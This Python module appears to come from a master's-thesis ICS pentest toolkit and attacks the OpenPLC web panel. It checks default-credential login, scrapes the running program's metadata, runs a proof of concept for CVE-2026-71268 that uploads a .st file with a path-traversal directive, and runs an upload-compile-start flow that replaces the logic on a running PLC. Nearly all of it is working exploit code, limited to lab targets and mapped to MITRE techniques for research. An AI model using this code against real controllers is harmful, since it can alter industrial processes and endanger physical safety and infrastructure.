#!/usr/bin/env python3
"""Pruebas contra el panel web de OpenPLC: login por defecto, CVE-2026-71268,
lectura del programa activo y upload+run. Ver TFM.pdf cap. "OpenPLC".
"""

import os
import re
import time

import config
from core import runner, evidence

try:
    import requests
    _REQUESTS_OK = True
except Exception as _e:  # noqa: BLE001
    _REQUESTS_OK = False
    _REQUESTS_ERR = str(_e)


# Las _do_* son la implementación in-process (las ejecuta el subproceso _cli
# para que proxychains intercepte los sockets).

def _base_url(target, port):
    return f"http://{target}:{port}"


def _login(session, base, user, password, sink):
    sink(f"[*] POST {base}/login  (usuario={user})")
    r = session.post(f"{base}/login",
                     data={"username": user, "password": password},
                     allow_redirects=False, timeout=15)
    sink(f"    -> HTTP {r.status_code}")
    if r.status_code in (302, 303) and "dashboard" in r.headers.get("Location", ""):
        return True
    d = session.get(f"{base}/dashboard", allow_redirects=False, timeout=15)
    sink(f"    -> GET /dashboard: HTTP {d.status_code}")
    return d.status_code == 200


def _do_default_login(ip, port, user, password, sink):
    if not _REQUESTS_OK:
        sink(f"[!] 'requests' no disponible: {_REQUESTS_ERR}")
        return
    base = _base_url(ip, port)
    try:
        session = requests.Session()
        if _login(session, base, user, password, sink):
            sink("[+] Acceso concedido: las credenciales por defecto siguen activas.")
        else:
            sink("[-] Las credenciales por defecto no funcionaron.")
    except Exception as e:  # noqa: BLE001
        sink(f"[!] Error de conexión: {e}")


_TR_RE = re.compile(r"<tr\b([^>]*>.*?)</tr>", re.DOTALL | re.IGNORECASE)
_TD_RE = re.compile(r"<td[^>]*>(.*?)</td>", re.DOTALL | re.IGNORECASE)
_TAG_RE = re.compile(r"<[^>]+>")
_TEXTAREA_RE = re.compile(
    r'<textarea[^>]*name="editor_data"[^>]*>(.*?)</textarea>',
    re.DOTALL | re.IGNORECASE,
)
_TABLE_ID_RE = re.compile(r"table_id\s*=\s*(\d+)", re.IGNORECASE)
_PROG_ID_RE = re.compile(
    r"(?:program-page|reload-program|edit-program|display-program|"
    r"download-program|compile-program|program)/(\d+)",
    re.IGNORECASE,
)
_PROG_FILE_RE = re.compile(
    r"[?&]file=([^\"'&<>\s]+)",
    re.IGNORECASE,
)
_HIDDEN_PROG_FILE_RE = re.compile(
    r"""name=['"]prog_file['"][^>]*value=['"]([^'"]+)""",
    re.IGNORECASE,
)


def _strip(html_fragment):
    """Quita etiquetas HTML y normaliza espacios."""
    return _TAG_RE.sub("", html_fragment).strip()


def _dump_html(ip, label, body, sink):
    """Guarda un HTML en work/debug_<ip>_<ts>_<label>.html para diagnóstico."""
    try:
        path = os.path.join(
            config.WORK_DIR,
            f"debug_{ip}_{int(time.time())}_{label}.html")
        with open(path, "w", encoding="utf-8", errors="replace") as f:
            f.write(body)
        sink(f"    (HTML volcado a {path})")
    except Exception as e:  # noqa: BLE001
        sink(f"    (no pude volcar HTML: {e})")


def _active_from_dashboard(session, base, ip, sink):
    """Lee /dashboard y extrae el programa activo por nombre.

    OpenPLC v3 muestra en el dashboard, dentro de un bloque de información,
    algo del tipo "Program: <Name>" o "Program running: <Name>". Devolvemos
    el nombre si lo encontramos, o None.
    """
    sink(f"[*] GET {base}/dashboard  (para localizar el programa activo)")
    r = session.get(f"{base}/dashboard", timeout=15)
    sink(f"    -> HTTP {r.status_code}")
    patrones = [
        r"Program\s*(?:running|loaded|name)?\s*[:=]\s*</?[^>]*>\s*([^<\n\r]+)",
        r"Program\s*(?:running|loaded|name)?\s*[:=]\s*([^<\n\r]+)",
        r"<b>\s*Program\s*</b>\s*[:=]?\s*([^<\n\r]+)",
    ]
    for pat in patrones:
        m = re.search(pat, r.text, re.IGNORECASE)
        if m:
            nombre = _strip(m.group(1)).strip(" .:")
            if nombre and nombre.lower() not in ("none", "n/a"):
                sink(f"    -> Programa activo (según /dashboard): '{nombre}'")
                return nombre, r.text
    sink("    -> No pude extraer el programa activo del /dashboard.")
    return None, r.text


def _get_programs_table(session, base, ip, sink):
    """Lista programas de /programs y marca el activo según /dashboard.

    No asume orden de columnas: por cada <tr> busca la celda que termina en
    .st (file), la celda que coincide con el nombre del dashboard (name) y
    deja el resto como metadatos. Siempre vuelca el HTML a work/debug_... para
    que podamos ajustar el patrón si cambia la plantilla.

    Devuelve (lista, nombre_activo). Cada entrada:
        {"id", "name", "descr", "file", "date"}
    """
    activo_nombre, dash_html = _active_from_dashboard(session, base, ip, sink)

    sink(f"[*] GET {base}/programs")
    r = session.get(f"{base}/programs", timeout=15)
    sink(f"    -> HTTP {r.status_code}")

    _dump_html(ip, "programs", r.text, sink)
    _dump_html(ip, "dashboard", dash_html, sink)

    sink("[debug] parser build 2026-10-12b (table_id-first)")
    programas = []
    for row in _TR_RE.findall(r.text):
        if "<th" in row.lower() or "<thead" in row.lower():
            continue
        celdas = [_strip(c) for c in _TD_RE.findall(row)]
        celdas = [c for c in celdas if c != ""]
        if len(celdas) < 2:
            continue
        pid = None
        m_tid = _TABLE_ID_RE.search(row)
        if m_tid:
            pid = m_tid.group(1)
            sink(f"[debug] fila -> table_id={pid}, celdas={celdas}")
        else:
            m_id = _PROG_ID_RE.search(row)
            if m_id:
                pid = m_id.group(1)
                sink(f"[debug] fila -> prog_id={pid}, celdas={celdas}")
            else:
                sink(f"[debug] fila sin id, celdas={celdas}")

        fname = next((c for c in celdas if c.lower().endswith(".st")), "")
        if activo_nombre:
            name = next(
                (c for c in celdas
                 if c.strip() == activo_nombre.strip()
                 and not c.lower().endswith(".st")),
                "")
        else:
            name = ""
        if not name:
            name = next(
                (c for c in celdas
                 if not c.lower().endswith(".st")
                 and not re.match(r"^[A-Z][a-z]{2}\s+\d", c)
                 and len(c) <= 40),
                celdas[0])
        resto = [c for c in celdas if c not in (name, fname)]
        descr = next((c for c in resto
                      if not re.match(r"^[A-Z][a-z]{2}\s+\d", c)),
                     "")
        date = next((c for c in resto
                     if re.match(r"^[A-Z][a-z]{2}\s+\d", c)),
                    "")
        if not pid:
            pid = fname or name or f"idx{len(programas)}"
        programas.append({"id": pid, "name": name, "descr": descr,
                           "file": fname, "date": date})

    if not programas:
        sink("[-] /programs no devolvió filas reconocibles.")
    return programas, activo_nombre


def _download_st(session, base, prog_id, filename, dest_path, sink):
    """Intenta descargar el .st del programa indicado.

    En el fork OpenPLC_v3 pineado en el laboratorio (SHA b5d4135...),
    confirmado leyendo webserver.py en GitHub, NO existe ninguna ruta HTTP
    que devuelva el .st de un programa ya cargado: /update-program solo
    renderiza un formulario para sobrescribirlo; /st-files no está servida;
    no hay /download-program ni /program/<id>. Mantenemos una comprobación
    mínima por si una build futura expone /st-files/<file> como estático.
    """
    if filename:
        url = f"{base}/st-files/{filename}"
        sink(f"[*] GET {url}  (único endpoint plausible)")
        r = session.get(url, timeout=20)
        sink(f"    -> HTTP {r.status_code} ({len(r.content)} bytes)")
        if r.status_code == 200 and r.content.strip():
            with open(dest_path, "wb") as f:
                f.write(r.content)
            sink(f"[+] .st guardado en {dest_path}")
            return True

    sink("[-] Este fork de OpenPLC no expone el .st por HTTP (confirmado contra")
    sink("    webserver.py del commit b5d4135). Guardo metadatos como evidencia.")
    return False


def _do_get_current_program(ip, port, user, password, sink):
    if not _REQUESTS_OK:
        sink(f"[!] 'requests' no disponible: {_REQUESTS_ERR}")
        return
    base = _base_url(ip, port)
    session = requests.Session()
    try:
        if not _login(session, base, user, password, sink):
            sink("[-] Login fallido; abortando.")
            return
        sink("[+] Sesión establecida.")
        programas, activo_nombre = _get_programs_table(session, base, ip, sink)
        if not programas and not activo_nombre:
            sink("[-] No pude extraer ni /programs ni el programa activo del /dashboard.")
            return
        sink("")
        sink("    Ref                  | Name                | Description          | File                   | Fecha        | Activo")
        sink("    ---------------------+---------------------+----------------------+------------------------+--------------+-------")
        activo = None
        for p in programas:
            es_activo = (activo_nombre is not None and
                         (p["name"].strip() == activo_nombre.strip() or
                          p["file"].strip() == activo_nombre.strip()))
            marca = "  *" if es_activo else ""
            if es_activo and activo is None:
                activo = p
            sink(f"    {str(p['id'])[:20]:<20} | {p['name'][:19]:<19} | {p['descr'][:20]:<20} | "
                 f"{p['file'][:22]:<22} | {p['date'][:12]:<12} | {marca}")
        sink("")
        if activo is None and activo_nombre and programas:
            sink(f"[!] Dashboard dice '{activo_nombre}', pero no coincide con "
                 "ninguna fila de /programs; descargando por nombre como fallback.")
            activo = {"id": activo_nombre, "name": activo_nombre,
                      "file": activo_nombre, "descr": "", "date": ""}
        if activo:
            sink(f"[+] Programa activo: '{activo['name']}' (fichero='{activo['file']}')")
            fname = activo.get("file") or f"prog_{activo['id']}.st"
            dest = os.path.join(
                config.WORK_DIR,
                f"current_{ip}_{int(time.time())}_{os.path.basename(fname)}")
            ok = _download_st(session, base, activo["id"], activo["file"], dest, sink)
            if not ok:
                meta = dest + ".metadata.txt"
                with open(meta, "w", encoding="utf-8") as f:
                    f.write("# Programa activo del PLC (metadatos exfiltrados por HTTP)\n")
                    f.write(f"target     : {ip}\n")
                    f.write(f"table_id   : {activo['id']}\n")
                    f.write(f"name       : {activo['name']}\n")
                    f.write(f"file       : {activo['file']}\n")
                    f.write(f"descr      : {activo.get('descr','')}\n")
                    f.write(f"date       : {activo.get('date','')}\n")
                    f.write("note       : Esta build de OpenPLC no expone el .st por HTTP;\n")
                    f.write("             el fichero fuente queda en el filesystem del PLC,\n")
                    f.write("             accesible solo con shell en el contenedor.\n")
                sink(f"[+] Metadatos del programa activo guardados en {meta}")
        else:
            sink("[-] No se identificó un programa activo.")
    except Exception as e:  # noqa: BLE001
        sink(f"[!] Error durante la lectura: {e}")


def _upload_st_file(session, base, st_file, prog_name, prog_descr, sink):
    """Sube un .st al PLC siguiendo el flujo de dos pasos del webserver.

    Paso A: POST /upload-program (multipart) -> servidor guarda el .st en
            disco con un nombre aleatorio y devuelve un formulario HTML.
    Paso B: POST /upload-program-action (form) -> inserta fila en la DB.

    Devuelve el nombre aleatorio asignado por el servidor (p.ej. '739281.st')
    o None si algo falla.
    """
    fname_local = os.path.basename(st_file)

    sink(f"[*]   A) POST {base}/upload-program  (file={fname_local})")
    with open(st_file, "rb") as fh:
        r = session.post(f"{base}/upload-program",
                         files={"file": (fname_local, fh, "application/octet-stream")},
                         allow_redirects=False, timeout=30)
    sink(f"       -> HTTP {r.status_code}")
    if r.status_code != 200:
        sink(f"[-]   /upload-program devolvió {r.status_code}; se esperaba 200.")
        return None

    m = _HIDDEN_PROG_FILE_RE.search(r.text)
    if not m:
        m2 = re.search(r"value='(\d+\.st)'", r.text)
        if m2:
            m = m2
    if not m:
        sink("[-]   No pude extraer el nombre aleatorio del HTML devuelto.")
        _dump_html("upload", "upload-program-resp", r.text, sink)
        return None
    server_file = m.group(1)
    sink(f"       -> Servidor asignó: {server_file}")

    epoch = str(int(time.time()))
    m_epoch = re.search(r"name='epoch_time'[^>]*value='(\d+)'", r.text)
    if m_epoch:
        epoch = m_epoch.group(1)

    sink(f"[*]   B) POST {base}/upload-program-action  (prog_file={server_file})")
    r2 = session.post(f"{base}/upload-program-action",
                      data={"prog_name": prog_name,
                            "prog_descr": prog_descr,
                            "prog_file": server_file,
                            "epoch_time": epoch},
                      allow_redirects=False, timeout=30)
    sink(f"       -> HTTP {r2.status_code}")
    return server_file


def _wait_compile(session, base, server_file, sink, timeout=45):
    """Dispara compilación y espera a que termine (polling compilation-logs)."""
    sink(f"[*]   GET {base}/compile-program?file={server_file}")
    c = session.get(f"{base}/compile-program",
                    params={"file": server_file}, timeout=30)
    sink(f"       -> HTTP {c.status_code}")
    if c.status_code != 200:
        sink(f"[-]   /compile-program devolvió {c.status_code}.")
        return False

    deadline = time.time() + timeout
    last_log = ""
    while time.time() < deadline:
        time.sleep(2)
        lr = session.get(f"{base}/compilation-logs", timeout=10)
        log = lr.text.strip() if lr.status_code == 200 else ""
        if log and log != last_log:
            last_log = log
        if "Compilation finished" in log or "Success" in log:
            sink(f"[+]   Compilación exitosa.")
            return True
        if "Error" in log and "error" not in log[:20].lower():
            sink(f"[-]   Error de compilación detectado:")
            for line in log.splitlines()[-5:]:
                sink(f"       {line}")
            return False
    if last_log:
        sink(f"[*]   Último log de compilación:")
        for line in last_log.splitlines()[-5:]:
            sink(f"       {line}")
    sink(f"[-]   Timeout ({timeout}s) esperando compilación.")
    return False


def _do_upload_run(ip, port, user, password, st_file, prog_name, prog_descr, sink):
    if not _REQUESTS_OK:
        sink(f"[!] 'requests' no disponible: {_REQUESTS_ERR}")
        return
    if not st_file or not os.path.exists(st_file):
        sink(f"[-] No encuentro el fichero .st indicado: {st_file!r}")
        sink("    Indica una ruta a un .st de tu laboratorio.")
        return
    base = _base_url(ip, port)
    session = requests.Session()
    try:
        if not _login(session, base, user, password, sink):
            sink("[-] Login fallido; abortando.")
            return
        sink("[+] Sesión establecida.")

        sink("[*] Paso 1/4 - Backup del programa actualmente cargado")
        try:
            programas, activo_nombre = _get_programs_table(session, base, ip, sink)
            activo = None
            if activo_nombre:
                activo = next((p for p in programas
                                if p["name"].strip() == activo_nombre.strip()
                                or p["file"].strip() == activo_nombre.strip()),
                               None)
                if activo is None:
                    activo = {"id": activo_nombre, "name": activo_nombre,
                              "file": activo_nombre, "descr": "", "date": ""}
            if activo:
                fname = activo.get("file") or f"prog_{activo['id']}.st"
                dest = os.path.join(
                    config.WORK_DIR,
                    f"backup_{ip}_{int(time.time())}_{os.path.basename(fname)}")
                _download_st(session, base, activo["id"], activo["file"], dest, sink)
            else:
                sink("[-] No se identificó programa activo; sigo sin backup.")
        except Exception as e:  # noqa: BLE001
            sink(f"[!] Backup falló ({e}); continúo con el upload.")

        sink(f"[*] Paso 2/4 - Subir fichero .st al PLC")
        server_file = _upload_st_file(session, base, st_file,
                                      prog_name, prog_descr, sink)
        if not server_file:
            sink("[-] Upload falló; abortando.")
            return

        sink(f"[*] Paso 3/4 - Compilar programa ({server_file})")
        _wait_compile(session, base, server_file, sink)

        sink(f"[*] Paso 4/4 - GET {base}/start_plc  (arranque efectivo)")
        s = session.get(f"{base}/start_plc", allow_redirects=False, timeout=15)
        sink(f"    -> HTTP {s.status_code}")
        if s.status_code in (200, 302):
            sink("[+] Flujo upload+compile+start completado.")
            sink("    El runtime debe estar ejecutando ahora el nuevo programa.")
        else:
            sink("[-] /start_plc no devolvió 200/302; revisa el panel del PLC.")
    except Exception as e:  # noqa: BLE001
        sink(f"[!] Error durante el flujo: {e}")


def _do_cve_2026_71268(ip, port, user, password, st_file, prog_name, prog_descr, sink):
    if not _REQUESTS_OK:
        sink(f"[!] 'requests' no disponible: {_REQUESTS_ERR}")
        return
    if not st_file or not os.path.exists(st_file):
        sink(f"[-] No encuentro el fichero .st indicado: {st_file!r}")
        sink("    Indica una ruta a un .st de tu laboratorio (p.ej. 62362.st).")
        return
    base = _base_url(ip, port)
    session = requests.Session()
    try:
        if not _login(session, base, user, password, sink):
            sink("[-] Login fallido; abortando.")
            return
        sink("[+] Sesión establecida.")

        sink(f"[*] Subiendo .st al PLC")
        server_file = _upload_st_file(session, base, st_file,
                                      prog_name, prog_descr, sink)
        if not server_file:
            sink("[-] Upload falló; abortando.")
            return

        sink(f"[*] Compilando programa ({server_file})")
        _wait_compile(session, base, server_file, sink)
        sink("[+] Flujo completado. Revisa el dashboard del PLC para verificar el programa cargado.")
    except Exception as e:  # noqa: BLE001
        sink(f"[!] Error durante el flujo: {e}")


def _launch_cli(action, args, path, sink):
    cmd = ["python3", "-m", "modules._cli.openplc_cli", action] + args
    cmd = runner.wrap_proxy(cmd)
    runner.run_command(cmd, path, sink=sink, timeout=120, cwd=config.BASE_DIR)


def default_login(target=None, port=None, user=None, password=None, sink=None):
    """Comprueba el acceso con credenciales por defecto (T0812)."""
    ip = runner.assert_lab_target(target or config.OPENPLC_DEFAULT_TARGET)
    port = port or config.OPENPLC_DEFAULT_PORT
    user = user or config.OPENPLC_DEFAULT_USER
    password = password or config.OPENPLC_DEFAULT_PASS
    path = evidence.new_evidence_file("openplc", "default_login")
    evidence.header(path, "OpenPLC - Login con credenciales por defecto",
                    f"{ip}:{port} ({user}:{password})",
                    config.MITRE_MAP["openplc.default_login"])
    _launch_cli("default_login",
                ["--target", ip, "--port", str(port),
                 "--user", user, "--password", password],
                path, sink)
    return path


def cve_2026_71268(target=None, port=None, user=None, password=None,
                   st_file=None, prog_name="CVE-2026-71268-PoC",
                   prog_descr="PoC TFM", sink=None):
    """PoC de CVE-2026-71268: sube un .st con directiva de path traversal y compila (T0843/T0873)."""
    ip = runner.assert_lab_target(target or config.OPENPLC_DEFAULT_TARGET)
    port = port or config.OPENPLC_DEFAULT_PORT
    user = user or config.OPENPLC_DEFAULT_USER
    password = password or config.OPENPLC_DEFAULT_PASS
    path = evidence.new_evidence_file("openplc", "cve_2026_71268")
    evidence.header(path, "OpenPLC - CVE-2026-71268 (subida + compilación de .st)",
                    f"{ip}:{port} prog={prog_name}",
                    config.MITRE_MAP["openplc.cve_2026_71268"])
    args = ["--target", ip, "--port", str(port),
            "--user", user, "--password", password,
            "--prog-name", prog_name, "--prog-descr", prog_descr]
    if st_file:
        args += ["--st-file", st_file]
    _launch_cli("cve_2026_71268", args, path, sink)
    return path


def get_current_program(target=None, port=None, user=None, password=None, sink=None):
    """Lee el nombre y el .st del programa actualmente cargado en el PLC."""
    ip = runner.assert_lab_target(target or config.OPENPLC_DEFAULT_TARGET)
    port = port or config.OPENPLC_DEFAULT_PORT
    user = user or config.OPENPLC_DEFAULT_USER
    password = password or config.OPENPLC_DEFAULT_PASS
    path = evidence.new_evidence_file("openplc", "get_current_program")
    evidence.header(path, "OpenPLC - Lectura del programa activo",
                    f"{ip}:{port} ({user}:{password})",
                    config.MITRE_MAP["openplc.get_current_program"])
    _launch_cli("get_current_program",
                ["--target", ip, "--port", str(port),
                 "--user", user, "--password", password],
                path, sink)
    return path


def upload_run(target=None, port=None, user=None, password=None,
               st_file=None, prog_name="UPLOAD-RUN-PoC",
               prog_descr="PoC TFM upload_run", sink=None):
    """Sube un .st, lo compila y lo arranca; guarda backup del activo previo."""
    ip = runner.assert_lab_target(target or config.OPENPLC_DEFAULT_TARGET)
    port = port or config.OPENPLC_DEFAULT_PORT
    user = user or config.OPENPLC_DEFAULT_USER
    password = password or config.OPENPLC_DEFAULT_PASS
    path = evidence.new_evidence_file("openplc", "upload_run")
    evidence.header(path, "OpenPLC - Subida + compilación + arranque (upload_run)",
                    f"{ip}:{port} prog={prog_name}",
                    config.MITRE_MAP["openplc.upload_run"])
    args = ["--target", ip, "--port", str(port),
            "--user", user, "--password", password,
            "--prog-name", prog_name, "--prog-descr", prog_descr]
    if st_file:
        args += ["--st-file", st_file]
    _launch_cli("upload_run", args, path, sink)
    return path
